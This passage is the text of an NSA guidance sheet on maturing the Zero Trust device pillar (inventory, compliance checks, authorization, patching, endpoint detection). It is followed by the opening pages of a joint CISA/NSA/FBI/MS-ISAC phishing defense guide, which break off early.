response. Implementing this framework places network defenders in a better position to
secure sensitive data, systems, applications, and services. [2]
This cybersecurity information sheet (CSI) provides recommendations for maturing
devices
the Zero Trust device pillar
to effectively ensure all devices seeking access
earn trust based on device metadata and continual checks to determine if the device
meets the organization
s minimum bar for access. The primary capabilities of the device
pillar are:
identification, inventory, and authentication
detection of unknown devices and configuration compliance checks of known
ones
device authorization using real time inspections
remote access protections
hardware updates and software patches
device management capabilities
endpoint detection and response for threat detection and mitigation
This CSI further discusses how these capabilities integrate into a comprehensive Zero
Trust (ZT) framework, as described in Embracing a Zero Trust Security Model. [2]
National Security System (NSS), Department of Defense (DoD), and Defense Industrial
Base (DIB) owners and operators should use this and complementary guidance to
understand how to take concrete steps for maturing device security by implementing the
outlined capabilities.
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Contents
Executive summary ......................................................................................................... 1
Introduction ..................................................................................................................... 3
Audience ......................................................................................................................... 4
Background ..................................................................................................................... 4
Device pillar ..................................................................................................................... 5
Device inventory .......................................................................................................... 7
Device detection and compliance ................................................................................ 8
Device authorization with real time inspection ........................................................... 10
Remote access protection ......................................................................................... 10
Automated vulnerability and patch management ....................................................... 12
Centralized device management ............................................................................... 13
Endpoint threat detection and response .................................................................... 14
Summary of guidance ................................................................................................... 16
Further guidance ........................................................................................................... 17
Works cited ................................................................................................................... 17
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Introduction
Cybersecurity threats are increasing and can originate from a variety of sources 
 from
nation-state actors conducting organized campaigns to individual malicious actors
seeking an easy payday. To better secure networks from these threats, networks need
to transition from traditional defenses to a Zero Trust (ZT) framework. The ZT security
model is best illustrated as seven pillars that together comprise the complete
cybersecurity posture. The seven pillars are: User, Device, Network & Environment,
Application & Workload, Data, Automation & Orchestration, and Visibility & Analytics.
Each pillar requires certain criteria and objectives to achieve ZT enactment.
This cybersecurity information sheet (CSI) focuses on the device pillar and includes
recommendations for reaching increasing maturity levels of device pillar capabilities.
Having the ability to identify, authenticate, inventory, authorize, isolate, secure,
remediate, and control all devices is essential in a ZT approach. Understanding the
health and status of devices informs risk decisions, with real time compliance
inspections, continuous risk assessments, and automated remediation informing every
access request. [3]
In addition to the more common high-level threats to operating systems and application
software, ZT capabilities must defend systems from persistent and hard-to-detect
threats against devices. Past examples of low-level, persistent threats include:
LoJax boot rootkit [4]
MosiacRegressor firmware implant [5]
UEFI Secure Boot bypasses BootHole [6] and BlackLotus [7]
Side channel vulnerabilities such as Spectre, Meltdown, Fallout, ZombieLoad,
NetSpectre, Downfall, and Inception
SSD over-provisioning malware [8]
This ZT device pillar CSI prescribes mechanisms to shield devices from low-level,
persistent threats over their entire lifecycle. Adoption of a ZT mindset enables
organizations to never assume devices within an established environment are secure or
that actors cannot hide from defenses in the OS or applications by delving into
hardware and firmware. Implementing mature ZT device pillar capabilities enables
organizations to assess devices and respond to risks to critical resources in the
environment.
For further background on the ZT concept, refer to Embracing a Zero Trust Security
Model. [2] For details on user pillar maturation, refer to Advancing Zero Trust Maturity
Throughout the User Pillar. [9]
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Audience
This CSI provides guidance primarily intended for NSS, DoD, and the DIB, but may be
useful for owners and operators of other systems that might be targeted by
sophisticated malicious actors. Guidance for system owners and operators is also
available via the National Institute of Standards and Technology (NIST), [10] and the
Cybersecurity and Infrastructure Security Agency (CISA). [11] This guidance
incorporates the DoD ZT guidance [12] referenced at the end of this document.
Background
The President
s Executive Order on Improving the Nation
s Cybersecurity (EO 14028)
and National Security Memorandum 8 (NSM-8) direct the Federal Civilian Executive
Branch (FCEB) agencies and NSS owners and operators to develop and implement
plans to adopt a ZT cybersecurity framework. [1] [13] ZT implementation efforts are
intended to continually mature cybersecurity protections, responses, and operations
over time. Progression of capabilities in each of the seven pillars should be seen as a
cycle of continuous improvement based on evaluation and monitoring of threats. [2]
Figure 1 depicts the ZT pillars, including the device pillar. The capabilities and
milestones for the device pillar component of the ZT maturity model are described in
detail throughout this document. Even though they are depicted separately, it is
Figure 1: Description of the seven pillars of Zero Trust
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
important to note that the pillars are not independent; many capabilities in the device
pillar depend on or align with capabilities in other pillars, as indicated.
Identity and authentication are based on the user pillar. Devices hosting users are
authenticated and authorized to connect to the requested resources based on device
attributes. Infrastructure devices are identified and authorized in support of
management activities aimed at discovering and responding to threats. Dynamic
authentication and authorization decisions are strictly enforced before access is
allowed. Recommendations on device connection protocols are included in the network
and environment, data, and visibility and analytics pillars. Authentication and remote
access are based on the network environment pillar.
Endpoint detection & response (EDR) and extended detection & response (XDR) tools
integrate with both the visibility & analytics and the automation & orchestration pillars.
EDR/XDR tools enable system administrators to identify, detect, and respond to threats
that may be pervasive or present in the environment. Additionally, these security
platforms support the necessary analytics that assist with achieving a greater
understanding of the performance, behavior, and activities required to improve detection
of anomalous behavior to make real time changes in security policies and access
decisions.
Device pillar
The device pillar is a foundational component of ZT to ensure devices within an
environment, and devices connected to or attempting to connect to resources, are
located, enumerated, authenticated, and assessed. Devices are subsequently permitted
or denied access 
 based on a dynamic risk calculation 
 to specific objects or data. A
device is only authorized access if it is 
compliant
 (meets the environment
s security
conditions specified by policy). Devices determined to be non-compliant may be denied
access or granted limited access.
Each of the following key device pillar capabilities has associated maturity levels:
Device Inventory: Creating device inventory management systems and
maintaining real time device inventories. Maintaining a trusted inventory list by
enrolling all devices authorized to access the network once they are properly
evaluated enables establishing a deny-by-default access policy for devices.
Device Detection and Compliance: Detecting devices as they connect to the
network and ensuring compliance with device policies specific to the device
function and current risk posture.
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Device Authorization with Real Time Inspection: Establishing and utilizing
policies to deny devices access to digital resources by default and explicitly
allowing access based on compliance, function, and measured risk. Continuous
monitoring and behavior analysis enables faster remediation of a broader class
of security threats.
Remote Access Protection: Creating policies to allow authenticated and
authorized users and devices to access resources from remote locations.
Automated Vulnerability and Patch Management: Identifying the hardware,
firmware, and software versions along with their patch levels on devices,
correlating them with support information and known vulnerabilities, and
upgrading and patching the systems to minimize known risks.
Centralized Device Management: Establishing tooling to manage, secure, and
deploy security configurations and applications for computers and mobile
devices. In particular, remotely managing and enforcing security policies on
organization issued devices.
Endpoint Threat Detection and Response: Implementing tooling to monitor,
detect, and remediate malicious activity on devices, integrating with network-wide
visibility and defense orchestration capabilities.
As capabilities mature and additional capabilities are deployed, enterprises advance
through basic, intermediate, and advanced maturity phases and are more able to
operate according to ZT principles.
Figure 2: Zero Trust device pillar maturity
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Device inventory
Knowing what is in an organization
s environment is a foundation to establishing trust in
the environment. A device inventory lists what devices are known and expected in the
environment. The device inventory can then be used as the basis for starting to
establish trust in a device.
A device inventory must capture device existence, usage, and risks. All devices that
communicate in an environment require a unique identity and authentication as nonperson entities (NPE). Device usage can vary 
 examples include devices leveraging
session access protocols, resource devices hosting or providing network for
applications, or devices running embedded services. Enterprises must understand their
use of devices and that there is a difference in the way these devices present
cybersecurity risks.
The first step to securing the device pillar in a 
deny all
 by default environment is done
by establishing a complete inventory of registered devices that are allowed to access
enterprise resources. In some cases, inventory solutions can collect hardware and
software information, including versions, patch levels, and installed applications, which
are important in establishing security baselines, application allowlisting, and situational
awareness across all inventoried devices. Dynamic inventories may include both
managed and unmanaged devices that have been granted authorized access to
enterprise resources. As maturity increases, dynamic inventories are updated in real
time.
Devices may be added or removed from an inventory over time. The action of modifying
an inventory requires establishing enterprise policies governing:
Procurement: Identify criteria governing device purchases. Device Authorization
 discussed later in this document 
 may involve the need for specific Trusted
Platform Module (TPM) certificates, firmware configuration, or component part
revisions. Vendors may list multiple variants or configurations of the same
device, but only some may have the necessary components and capabilities.
Acceptance Testing: NIST SP 800-161 calls for enterprises to adopt
acceptance testing as a mechanism to audit supply chain integrity. Software Bill
of Materials (SBOM), Reference Integrity Manifest (RIM), and TPM Platform
Certificate provide artifacts that establish an auditable chain of custody from the
production factory to the receiving organization. [14]
Deprovisioning: Devices may store protected data within components other
than the storage drive. Plan to securely erase storage media, factory reset
firmware, securely erase TPM NVRAM memory, reset Baseboard Management
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Controller (BMC) configurations, remove UEFI Secure Boot modifications, and
clean up other organization-specific customizations before retiring a device.
Inventory should support status records necessary to ensure safe and secure
deprovisioning.
Table 1: Device inventory maturity
Preparation
Basic
Intermediate
Advanced
Organizations
create an
inventory of
existing known
devices. The
inventory is
primarily manual
and may be
based on multiple
partial inventories
from disparate
systems.
Organizations
have a complete
list of devices in
separate
inventories.
Planning for
machine
identification and
authentication
using NPE Public
Key Infrastructure
(PKI) certificates
has started. The
organization has
identified specific
capabilities that
must be present
on newly acquired
assets.
Organizations have
a complete list of
devices with
standardized device
attributes and
version information.
Machine
identification and
authentication using
NPE certificates and
deny all, allow by
exception
 approach
is mostly
implemented. The
organization has
identified specific
make, model, and
revisions of devices
eligible for new
acquisitions.
Automation has
begun to maintain
the device list and
bring together
disparate
inventories.
Organizations have a
complete inventory of
all devices updated
in real time using
NPE certificates,
enabling only
approved devices to
be allowed with all
others denied by
default. An
organization
acceptance process
checks all newly
acquired devices and
a deprovisioning
process sanitizes all
devices retired from
use.
Device detection and compliance
Networks have many uses and are often intended to be dynamic and adjust to changing
uses. Devices entering or leaving the network is part of the expected changes to the
network, along with the state of devices changing. Detecting devices and their
compliance related to an expected baseline enables managing of the network
environment and deciding whether to grant access to devices.
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Detection of devices within an environment is achieved through various protocols and
solutions. The organization must establish device connection policies that assess
device configurations and ensure devices comply with policies established per network
and organizational policy. Non-compliant devices represent an unacceptable risk to the
organization and should not have access to enterprise resources. For example, one
critical area that device configurations affect is the encryption settings a device will use
for its communications. In this example, non-compliant configurations could allow the
use of obsolete encryption, enabling malicious actors to hijack communications to steal
sensitive data, install malware, and other activities. Actions and policies for noncompliant or unknown devices must consider risk posture allowance including ensuring
logging, analytics, automated responses, and orchestration.
Organizations must periodically reevaluate compliance policies. Threats to devices may
necessitate changes to hardware configuration, firmware version, boot executables, or
other device properties over time. Some device vulnerability mitigations may impart a
performance impact that requires organizations to balance risk exposure and device
performance against organizational objectives.
Table 2: Device detection and compliance maturity
Preparation
Basic
Intermediate
Advanced
Organizations
employ asset
management
systems for user
devices to report
on compliance
with baseline
configurations.
Organizations use
asset
management
systems for
different types of
devices to report
compliance.
Compliance
violations should
be logged for later
remediation if
appropriate.
Organizations have
established a
minimum selection
of compliance
attributes and
acceptable values.
Organizations use
asset management
systems to track
device
configurations and
check for
compliance when
devices request to
connect to the
network, denying
access for noncompliance.
Organizations track
configurations on all
devices, check for
compliance
continuously, and
automatically
remediate noncompliance when
identified. When
remediation is not
feasible, the
organization uses
established, riskbased criteria
specific to the device
function and
capabilities in
determining whether
to allow access and
how much.
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Device authorization with real time inspection
Managing a ZT architecture means actively checking that devices in the environment
should be trusted for access to critical resources. Authorizing those access requests
should be based on current checks that the devices should be trusted for access
just based on a history of being granted access previously.
Making proper authorization decisions requires the most up-to-date information on
which to assess the risk of granting access to data or resources, using information from
the Device Detection and Compliance capability combined with real time inspection of
additional compliance information as needed. For example, real time inspection may
compare current device properties against those from the recorded inventory, examine
the device
s current patch status, or look for unexpected credentials or applications on
the device. Authorization with real time inspection provides continual status updates of a
device and its behavior to the decision points making the access decisions.
Organizations should establish continual authentication policies to ensure reauthentication of devices when new data or resource accesses are initiated. Each
device must be associated with both its current and expected state.
Table 3: Device authorization with real time inspection maturity
Preparation
Basic
Intermediate
Advanced
None at this level.
Organizations
provision devices
with a unique
identifier and are
individually
authorized.
Organizations use
device tooling (e.g.,
NextGen AV,
Application Control,
File Integrity
Monitoring (FIM),
EDR) integration to
better understand
the risk posture of a
device. Access
decisions leverage
the risk posture and
account for device
integrity,
authentication, and
encryption.
Organizations
integrate device
activity data into risk
decisions as well for
real time risk
assessment of
device behavior. All
access requests are
continuously vetted
prior to allowing
access to any
enterprise or cloud
assets.
Remote access protection
When organizations allow remote and hybrid work environments, it is imperative that
they authenticate and monitor all internal and external devices that request access to
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
protected resources. Challenges organizations faced using the conventional
architecture was that the user
s credentials alone were treated as adequate to grant
access to network resources. In a mature ZT architecture, all devices, internal and
external, are continually authenticated and monitored.
In particular, organizations should assume a remote user
s environment is hostile and
that all traffic is being monitored and potentially modified by threat actors, so additional
scrutiny of those devices and their access requests is needed. If remote access is
authorized, cybersecurity policies, standards, and procedures should include specific
policy guidance for required device attributes. Creating a least privilege baseline is
critical and should be included for this activity. A thorough authentication, authorization,
risk assessment, and determination of acceptable risk must be conducted prior to
allowing remote access by all devices.
Organizations should audit existing device access processes and tooling to set a least
privilege baseline. Remote access requirements also cover basic bring your own device
(BYOD) and Internet of things (IoT) access. They should use the enterprise identity
provider (IdP) and only be granted access to approved applications and services when
using the acceptable set of device attributes. To accomplish this, BYOD domains may
be best governed according to ZT principles utilizing a mobile device management
(MDM) tool. Organizations with BYOD environments should look for MDM solutions with
separate enrollment policies for employees who want to use their personal devices. [15]
[16]
The following table shows remote access maturation from basic to advanced:
Table 4: Remote access protection maturity
Preparation
Basic
Intermediate
Advanced
None at this level.
Organizations
employ dynamic
access policies
with implicit
denials, explicit
approvals, and
centralized
management
solutions for all
remote devices.
Control device
access to
protected
Organizations use
centralized
management
systems to track
remote device
configurations and
check for
compliance when
devices request to
access resources.
All protected services
require dynamic
access decisions.
Automatically
remediate noncompliance when
identified.
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
resources and
report compliance.
Automated vulnerability and patch management
Allowable devices must maintain security updates and patches, otherwise they add
significant known mitigatable risks to the network. Having known vulnerabilities does not
build trust in devices, instead it should decrease trust. A Z architecture should mitigate
risks as much as possible, especially known vulnerabilities that can be patched. A 2023
patch management study found large companies manage at least 2,900 applications
across all devices, but more than half of them are not up to date with the latest patches.
[17] Automating vulnerability and patch management is critical to protecting resources
by defining a security baseline and denying access if this baseline is not met. Threat
actors constantly probe for known vulnerabilities 
low-hanging fruit
 that provide an
entry route into the targeted environment. Keeping firmware, software, and operating
systems up to date reduces the likelihood of being breached. Patches and updates
should be tested before implementation to ensure environment stability and that
applications continue to function. However, they should be prioritized and tested in a
timely manner so that devices are not left vulnerable longer than necessary.
This capability is a special case of the Device Detection and Compliance capability
combined with the Centralized Device Management capability to address critical known
vulnerabilities since they present a high risk to organizations
 devices. In many cases,
centralized device management solutions can automate vulnerability identification
based on known versions and vulnerabilities and can deploy the necessary patches and
updates.
Organizations must maintain awareness of firmware patches below the software layer.
These patches may not be delivered via OS patch managers or other automated
patching solutions. Some patches may come from the system vendor, while others may
be specific to an individual component manufacturer (e.g., SSD firmware provided by
the storage vendor 
 not the system vendor). There are two general realms of devicespecific patches:
1. Fixed System firmware: System vendors collaborate with soldered component
vendors to deliver patches to customers. CPU microcode and NIC (network
interface card) firmware is usually shared by the device's manufacturer.
2. Component firmware: Most frequently applies to components with standardized
connectors such as storage drives or graphics processors. Individual component
vendors provide firmware updates for their specific products.
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Table 5: Automated vulnerability and patch management maturity
Preparation
Basic
Intermediate
Advanced
Organizations
track
vulnerabilities
and apply
patches
manually.
Organizations use
automated feeds to
become aware of
patches. Patches
are manually tested
before deployment.
All unsupported
devices, including
any unsupported
hardware
components or
software are
identified with plans
for their upgrade or
retirement.
Organizations use
automated tests to
check patches for
reliability. Once
tests are complete,
patches are
manually approved
for automated
deployment to all
applicable devices
according to a
schedule intended
minimize exposure.
All unsupported
devices have been
removed from the
network.
Organizations use
automated feeds to
trigger patch download
and initial automated
testing, followed by
automated rollout
sequencing with
automated log and
performance analysis to
ensure reliability for
continued rollout. Any
devices that become
unsupported are
automatically flagged for
possible quarantine and
upgrade or removal.
Organizations also
leverage automated
asset acceptance testing
knowledge to carry out
component updates on
specific devices when
appropriate.
Manual or
automated (if
available)
processes to
maintain firmware
are instituted.
Centralized device management
Knowing that devices are configured securely and managed properly helps build trust in
them to then trust them with access to resources. Using centralized device
management tools allow the Information Technology team to manage, secure, and
deploy corporate resources and applications on any device from a single console. It
grants organizations the ability to centrally manage endpoint devices from a single
location. Additionally, it provides management with a single view of users that utilize
more than one device and assists with retrieving workplace analytics regarding them.
[18] It can also improve workplace productivity by continuously providing application and
content access to devices. These tools provide a method for organizations to manage
all devices from one central location, regardless of what platform they function in. These
centralized device management tools are often called Unified Endpoint Management
(UEM) solutions for traditional IT devices and Mobile Device Management (MDM)
solutions for mobile devices.
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Table 6: Centralized device management maturity
Preparation
Basic
Intermediate
Advanced
None at this level.
Organizations
employ centralized
device
management
solutions to
confirm device
compliance status
for user devices
and report if a
device
compliance meets
minimum
standards.
Organizations have
started integrating
centralized device
management (both
UEM and MDM
solutions as
needed) with
inventory
capabilities for
automated, dynamic
inventory of devices
combined with
device management
for compliance.
Organizations check
the integrity of
devices by
collecting device
integrity values from
the TPM and similar
device integrity
mechanisms.
Organizations
inventory all devices
via an automated
management
solution for all
services. Security
vulnerabilities are
identified and
patched or mitigated
automatically by the
device management
solutions. Policy is
enforced through IT
remote management
of issued mobile
devices. Device
integrity values are
collected and
compared to
Software Bill of
Materials (SBOM)
and Records
Information
Management (RIM)
relevant to the
device.
Endpoint threat detection and response
Endpoint threat detection is an essential component of ZT for the device pillar since
malicious activity is assumed to be happening at any time. Devices are expected to
detect those activities and actively respond to them to contain any damage and
remediate the issue. Devices are not inherently trusted, so local threat detection
capabilities on the device are used as one capability to build trust that the device is
secure. Endpoint threat detection includes local malware prevention solutions, such as
antivirus protections, along with other solutions that detect malicious or anomalous
behaviors on the device. Combining threat detection with response options enables the
device to protect itself from malicious threats. Additionally, reporting of detections and
anomalies to centralized visibility and orchestration capabilities (discussed in later
pillars) enables awareness by network defenders and appropriate system or network-
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
wide responses to sophisticated threats. Endpoint threat detection and response often
utilizes abilities of Endpoint Detection and Response (EDR) or Extended Detection and
Response (XDR) products.
EDR capabilities build upon prior generation Endpoint Security Systems (ESS) by
enabling integration of endpoint knowledge with Security Information and Event
Management (SIEM) platforms, Security Orchestration, Automation, and Response
(SOAR) platforms, incident response activities, and other ZT concepts. XDR platforms
further increase visibility and detection of cross-device threats by enabling the
correlation of artifacts from endpoints that differ in design, location, or hardware.
Correlation of disparate endpoint and environment information is a key maturity
measurement associated with advanced ZT, and implementation of XDR will enable
organizations to account for activity beyond traditional endpoints.
XDR implementation activities are closely related to SIEM/SOAR capabilities within the
Visibility & Analytics and Automation & Orchestration ZT pillars and may include
features that support, enhance, or streamline the deployment of other ZT concepts.
Robust EDR/XDR deployment can also provide enhancements to:
Endpoint coverage (visibility & response) across differing device hardware and
software.
Standardization of management interfaces, logging formats, APIs, and endpoint
security software footprints.
Integration of EDR/XDR with activities that reside in other ZT pillars, such as
Visibility & Analytics, Automation & Orchestration, and Application & Workload,
and can have compounding effects on achieving higher maturity levels.
Other considerations for EDR/XDR implementation:
EDR platforms benefit from integration with Threat Intelligence and Threat
Reputation providers. Endpoint connectivity should be evaluated to the greatest
extent possible when assessing the performance of a solution stack.
Evaluation of a solution stack should take other ZT pillar capability requirements
into consideration since EDR/XDR will have direct correlation to the achievement
of other ZT pillar capabilities.
EDR/XDR solutions have varying levels of protection features that require
suitability evaluation for each environment. Ensure the solution provides
detection, response, or remediation that corresponds with incident response
activity requirements and expectations.
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Table 7: Endpoint threat detection and response maturity
Preparation
Basic
Intermediate
Advanced
Organizations
utilize antimalware
solutions and
endpoint auditing
services to
support manual
remediation.
Organizations use
EDR solutions to
protect, monitor, and
respond to malicious
and anomalous
activities.
Organizations
prepare to integrate
Comply to Connect
(C2C) capabilities for
expanded device and
user checks prior to
allowing access.
NextGen AV tooling
covers maximum
number of
services/applications.
Organizations
utilize XDR
solutions to protect,
monitor, and
respond to
malicious and
anomalous
activities across
device types.
Integrations with
cross-pillar
capabilities have
been identified and
prioritized based on
risks. The riskiest
integration points
are identified and
integrated with
XDR. Basic alerting
sends analytics
from XDR stack to
the SIEM.
Organizations have
completed
integrating XDR
solutions at all
integration points,
expanding coverage
to fullest capacity.
Exceptions are
tracked and
managed using a
risk-based
methodical
approach. Extended
analytics enabling
ZT advanced
functionalities are
integrated into the
SIEM and other
appropriate
solutions.
Summary of guidance
The information presented here is not a standardized solution that fits all organizations,
but rather suggestions and considerations for implementing ZT concepts for devices.
Discovering and defining the organization
s mission and identifying the supporting
assets that need to be secured will help build a clearer picture of the as-is architecture
which can be compared against the recommendations in this pillar along with the other
ZT pillar CSIs. This comparison will help all stakeholders to identify organizational risks
and gaps and ultimately inform them on what a mature ZT architecture will look like for
their organization. Each organization will need to evaluate their individual requirements
to determine a suitable solution. The goal is to develop ZT roadmap strategies that align
with the organization
s ZT goals. The following guidance are the key ideas for
implementing the ZT device pillar:
Detect and identify devices within or connecting to the environment.
Authenticate, and continually re-authenticate, devices.
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
Use automated solutions to manage device configurations, vulnerabilities, and
patches.
Maintain a dynamic authorization list with policies and procedures in place for
denied devices.
Conduct risk-based assessments to determine access for all devices.
Enforce more stringent access policies for remote access due to the higher risk
environment.
Monitor endpoints for signs of threat activities, incorporating endpoint monitoring
and responses into network-wide security capabilities.
Further guidance
NSA is assisting DoD customers in piloting ZT architectures, coordinating activities with
existing NSS and DoD programs, and developing additional ZT guidance to support
system developers through the challenges of integrating ZT within NSS, DoD, and the
DIB environments. Upcoming additional guidance will help organize, guide, and simplify
incorporating ZT principles and designs into enterprise networks.
Works cited
The White House (2021), Executive Order 14028: Improving the Nation
s Cybersecurity.
https://www.whitehouse.gov/briefing-room/presidential-actions/2021/05/12/executive-order-onimproving-the-nations-cybersecurity/
[2] NSA (2021), Embracing a Zero Trust Security Model. https://
https://media.defense.gov/2021/Feb/25/2002588479/-1/1/0/CSI_EMBRACING_ZT_SECURITY_MODEL_UOO115131-21.PDF
[3] DoD (2022), DoD Zero Trust Strategy.
https://dodcio.defense.gov/Portals/0/Documents/Library/DoD-ZTStrategy.pdf
[4] Ars Technica (2018), First UEFI malware discovered in wild is laptop security software hijacked
by Russians. https://arstechnica.com/information-technology/2018/10/first-uefi-malwarediscovered-in-wild-is-laptop-security-software-hijacked-by-russians/
[5] Bleeping Computer (2020), MosaicRegressor: Second-ever UEFI rootkit found in the wild.
https://www.bleepingcomputer.com/news/security/mosaicregressor-second-ever-uefi-rootkitfound-in-the-wild/
[6] Eclypsium (2020), There's a Hole in the Boot. https://eclypsium.com/blog/theres-a-hole-in-theboot/
[7] ESET Research (2023), BlackLotus UEFI bootkit: Myth confirmed.
https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
[8] Tom's Hardware (2021), New Malware Uses SSD Over-Provisioning to Bypass Security
Measures. https://www.tomshardware.com/news/ssd-over-provisioning-vulnerability
[9] NSA (2023), Advancing Zero Trust Maturity Throughout the User Pillar.
https://media.defense.gov/2023/Mar/14/2003178390/-1/1/0/CSI_Zero_Trust_User_Pillar_v1.1.PDF
[10] NIST (2020), Special Publication 800-207: Zero Trust Architecture.
https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf
[11] Cybersecurity and Infrastructure Security Agency (2023), Zero Trust Maturity Model Version
2.0. https://www.cisa.gov/sites/default/files/2023-04/zero_trust_maturity_model_v2_508.pdf
[12] DoD (2022), Zero Trust Reference Architecture Version 2.0.
https://dodcio.defense.gov/Portals/0/Documents/Library/(U)ZT_RA_v2.0(U)_Sep22.pdf
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
NSA | Advancing Zero Trust Maturity Throughout the Device Pillar
[13] The White House (2022), National Security Memorandum 8: Improving the Cybersecurity of
National Security, Department of Defense, and Intelligence Community Systems.
https://www.whitehouse.gov/briefing-room/presidential-actions/2022/01/19/memorandum-onimproving-the-cybersecurity-of-national-security-department-of-defense-and-intelligencecommunity-systems/
[14] NIST (2022), NIST Special Publication 800-161r1: Cybersecurity Supply Chain Risk
Management Practices for Systems and Organizations.
https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-161r1.pdf
[15] NIST (2023), Special Publication 1800-22: Mobile Device Security: Bring Your Own Device
(BYOD). https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.1800-22.pdf
[16] NIST (2019), NISTIR 8228 Considerations for Managing Internet of Things (IoT) Cybersecurity
and Privacy Risks. https://nvlpubs.nist.gov/nistpubs/ir/2019/NIST.IR.8228.pdf
[17] Adaptiva (2023), 2023 Report: The State of Patch Management in the Digital Workplace.
https://adaptiva.com/resources/report/state-of-patch-management
[18] Computerworld (2021), What is UEM? Unified endpoint management explained.
https://www.computerworld.com/article/3625231/what-is-uem-unified-endpoint-managementexplained.html
Disclaimer of endorsement
The information and opinions contained in this document are provided "as is" and without any warranties or
guarantees. Reference herein to any specific commercial entity, product, process, or service by trade name,
trademark, manufacturer, or otherwise does not constitute or imply its endorsement, recommendation, or favoring by
the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Purpose
This document was developed in furtherance of the NSA
s cybersecurity mission, including its responsibilities to
identify and disseminate cyber threats to National Security Systems, Department of Defense, and the Defense
Industrial Base, and to develop and issue cybersecurity specifications and mitigations. This information may be
shared broadly to reach all appropriate stakeholders.
Contact
Cybersecurity Report Feedback: CybersecurityReports@nsa.gov
General Cybersecurity Inquiries or Customer Requests: Cybersecurity_Requests@nsa.gov
Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
Media Inquiries / Press Desk: NSA Media Relations: 443-634-0721, MediaRelations@nsa.gov
U/OO/214644-23 | PP-23-3606 | OCT 2023 Ver. 1.0
TLP:CLEAR
PHISHING GUIDANCE:
STOPPING THE ATTACK
CYCLE AT PHASE ONE
Publication: October 2023
Disclaimer: This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when
information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures
for public release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without
restriction. For more information on the Traffic Light Protocol, see cisa.gov/tlp/.
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
TLP:CLEAR
TABLE OF CONTENTS
OVERVIEW....................................................................................3
PHISHING TO OBTAIN LOGIN CREDENTIALS .............................4
MALWARE-BASED PHISHING ......................................................5
MITIGATIONS ...............................................................................5
INCIDENT RESPONSE .............................................................. 11
REPORTING .............................................................................. 12
CISA SERVICES ......................................................................... 12
RESOURCES ............................................................................. 13
ACKNOWLEDGEMENTS ........................................................... 14
DISCLAIMER ............................................................................. 14
REFERENCES............................................................................ 14
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
TLP:CLEAR
OVERVIEW
Social engineering is the attempt to trick someone into revealing
information (e.g., a password) or taking an action that can be
used to compromise systems or networks. Phishing is a form of
social engineering where malicious actors lure victims (typically
via email) to visit a malicious site or deceive them into providing
login credentials. Malicious actors primarily leverage phishing
for:
Obtaining login credentials. Malicious actors conduct
phishing campaigns to steal login credentials for initial
network access.
Malware deployment. Malicious actors commonly conduct
phishing campaigns to deploy malware for follow-on activity,
such as interrupting or damaging systems, escalating user
privileges, and maintaining persistence on compromised
systems.
The Cybersecurity and Infrastructure Security Agency (CISA),
National Security Agency (NSA), Federal Bureau of Investigation
(FBI), and Multi-State Information Sharing and Analysis Center
(MS-ISAC) are releasing this joint guide to outline phishing
techniques malicious actors commonly use and to provide
guidance for both network defenders and software
manufacturers. This will help to reduce the impact of phishing
attacks in obtaining credentials and deploying malware.
The guidance for network defenders is applicable to all
organizations but may not be feasible for organizations with
limited resources. Therefore, this guide includes a section of
tailored recommendations for small- and medium-sized
businesses that may not have the resources to hire IT staff
dedicated to a constant defense against phishing threats.
The guidance for software manufacturers focuses on secure-bydesign and -default tactics and techniques. Manufacturers
should develop and supply software that is secure against the
most prevalent phishing threats, thereby increasing the
cybersecurity posture of their customers.
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
TLP:CLEAR
PHISHING TO OBTAIN LOGIN CREDENTIALS
DEFINITION
In phishing attacks used to obtain login credentials, Malicious actors pose as trustworthy sources
